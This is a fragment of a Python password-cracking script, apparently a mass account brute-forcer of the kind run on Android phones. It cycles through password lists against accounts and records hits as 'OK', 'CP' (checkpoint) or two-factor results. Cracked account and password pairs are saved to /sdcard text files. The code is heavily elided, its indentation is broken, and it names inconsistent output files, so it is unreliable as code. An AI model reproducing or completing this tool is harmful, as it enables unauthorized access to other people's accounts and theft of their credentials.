...
def method():
    ...
    print(f"{oo('â€¢')}/sdcard/Yaseen-OK.txt")
    print('\033[1;93m='*25)
    print()
    def start(user):
     try:
        ...
        for pword in totalpass:
            ...
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mYASEEN-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92mâ€¢\033[1;97m '+pword+'  ')
                open('/sdcard/YASEEN-OK.txt','a').write(f'{acc} â€¢ {pword}\n')
                if c=='y':
                    try:
                ...
                break
                     ...
                     #pass
                #else:
                    print('\r\033[1;91m[\033[1;97mYASEEN-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91mâ€¢\033[1;97m '+pword+'   ')
                    cpacc.append(acc)
                    open('/sdcard/Hannan-CP.txt','a').write(f'{acc} â€¢ {pword}\n')
                    break
            elif "two_factor" in response.text:
                print('\r\033[1;95m[\033[1;97mYASEEN-2F\033[1;95m] \033[1;95m'+acc+' \033[1;95mâ€¢\033[1;95m '+pword+'   ')
                break
            else:
                continue
        loop += 1
        ...
        for pword in totalpass:
            ...
            if 'session_key' in response.text:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mYASEEN-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91mâ€¢\033[1;97m '+pword)
                cpacc.append(acc)
                open('/sdcard/YASEEN-CP.txt','a').write(f'{acc} â€¢ {pword}\n')
                break
            else:
                continue
        loop += 1    
